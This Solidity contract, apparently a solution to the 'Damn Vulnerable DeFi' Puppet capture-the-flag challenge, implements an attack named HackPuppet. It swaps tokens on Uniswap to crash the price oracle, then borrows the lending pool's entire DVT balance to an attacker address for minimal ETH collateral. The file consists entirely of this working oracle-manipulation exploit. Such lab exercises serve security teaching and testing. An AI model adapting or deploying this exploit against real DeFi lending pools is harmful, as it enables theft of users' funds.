// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IUniswapExchange} from "./IUniswapExchange.sol";
import {DamnValuableToken} from "../../DamnValuableToken.sol";

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;
}

contract HackPuppet {
    IUniswapExchange private uniswap;
    DamnValuableToken private token;
    IPuppetPool private pool;
    address private attacker;

    constructor(address _uniswap, address _token, address _pool, address _attacker) {
        uniswap = IUniswapExchange(_uniswap);
        token = DamnValuableToken(_token);
        pool = IPuppetPool(_pool);
        attacker = _attacker;
    }

    receive() external payable {}

    function attack() external payable {
        // swap DVT for ETH
        uint256 amountToSwap = token.balanceOf(address(this));
        token.approve(address(uniswap), amountToSwap);
        uniswap.tokenToEthSwapInput(amountToSwap, 1, block.timestamp + 5000);

        // borrow DVT from pool
        uint256 amountToBorrow = token.balanceOf(address(pool));
        pool.borrow{value: msg.value}(amountToBorrow, attacker);
    }
}
